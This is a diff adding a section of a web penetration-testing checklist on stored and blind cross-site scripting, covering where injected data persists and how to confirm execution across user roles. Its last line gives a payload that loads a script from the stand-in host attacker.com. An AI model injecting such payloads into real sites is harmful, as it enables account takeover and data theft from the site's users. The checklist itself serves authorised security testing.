@@ -1,0 +1,14 @@
+**Phase 3: Stored XSS Testing (OTG-INPVAL-002)**
+- Identify data persistence points:
+  - User profiles, comments, reviews
+  - Support tickets, messages
+  - File uploads (SVG, HTML, PDF with JS)
+  - API endpoints that store data
+- Inject payloads and verify persistence:
+  - Submit payload, navigate to display page
+  - Check if payload executes in victim context
+  - Test different user roles (admin, moderator, regular)
+- Test blind XSS:
+  - Inject payloads in logs, admin-only fields
+  - Use external callback (XSS Hunter, Burp Collaborator)
+  - Payload: `<script src=https://attacker.com/hook.js></script>`
